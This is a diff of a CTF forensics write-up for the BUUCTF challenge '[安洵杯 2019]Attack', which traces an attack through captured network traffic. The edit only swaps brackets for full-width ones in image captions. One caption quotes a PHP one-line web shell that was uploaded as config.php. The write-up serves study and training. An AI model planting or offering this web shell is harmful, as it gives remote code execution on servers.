@@ -26,7 +26,7 @@ tags:
 [安洵杯2019 官方Writeup(Web/Misc) - D0g3](https://xz.aliyun.com/t/6911?time__1311=n4%2bxnD0DgDuAG=DOzNDsA3xCTWk8DcAgBmoD&u_atoken=125653dce1d42cc643b337d1c883f99f&u_asig=0a472f9017274948088853311e0043#toc-24) 
 [[安洵杯 2019]Attack （详细解析）](https://blog.csdn.net/weixin_66146598/article/details/125129282) 
 
- ![BUUCTF 题目「[安洵杯 2019]Attack 1」页面，附件为 attachment.zip](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251228192327104.png)
+ ![BUUCTF 题目「［安洵杯 2019］Attack 1」页面，附件为 attachment.zip](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251228192327104.png)
 
 ### 题目描述：
 
@@ -52,7 +52,7 @@ tags:
 
  ![过滤 tcp.stream eq 819，可见 POST /upload.php 请求](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251228192332602.png)
 
- ![追踪该 TCP 流：上传 config.php，内容为一句话木马 <?php @eval($_POST['hack']);?>](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251228192334567.png)
+ ![追踪该 TCP 流：上传 config.php，内容为一句话木马 <?php @eval($_POST［'hack'］);?>](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251228192334567.png)
 
 往下分析，发现一组TCP流量疑似执行命令，请求流量经过base64混淆，返回流量使用ROT13加密
 
